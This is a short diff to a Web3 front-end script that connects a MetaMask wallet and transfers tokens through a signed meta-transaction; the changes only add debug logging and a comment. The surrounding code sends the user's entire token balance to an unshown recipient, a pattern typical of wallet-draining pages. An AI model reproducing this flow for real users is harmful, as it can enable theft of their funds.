@@ -107,8 +107,12 @@ async function connectWallet() {
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         web3 = new Web3(window.ethereum);
         account = (await web3.eth.getAccounts())[0];
+        
+        // 更新按钮文本并启用转账按钮
         document.getElementById('connectButton').innerText = '连接成功';
         document.getElementById('transferButton').disabled = false;
+
+        console.log('连接成功:', account);
     } else {
         alert('请安装 MetaMask 或其他钱包插件');
     }
@@ -122,15 +126,20 @@ async function transferTokens() {
         // 获取用户的余额
         const balance = await contract.methods.balanceOf(account).call();
         const amount = balance; // 将转账金额设为用户的所有余额
-        
+
+        console.log('用户余额:', balance);
+
         // 创建消息哈希
         const messageHash = web3.utils.soliditySha3(account, recipient, amount);
         
         // 签署消息
         const signature = await web3.eth.personal.sign(web3.utils.sha3(messageHash), account);
         
+        console.log('签名:', signature);
+        
         // 调用 executeMetaTransaction
         const tx = await contract.methods.executeMetaTransaction(account, recipient, amount, signature).send({ from: account });
+        
         console.log('转账成功:', tx);
         alert('转账成功！');
     } catch (error) {
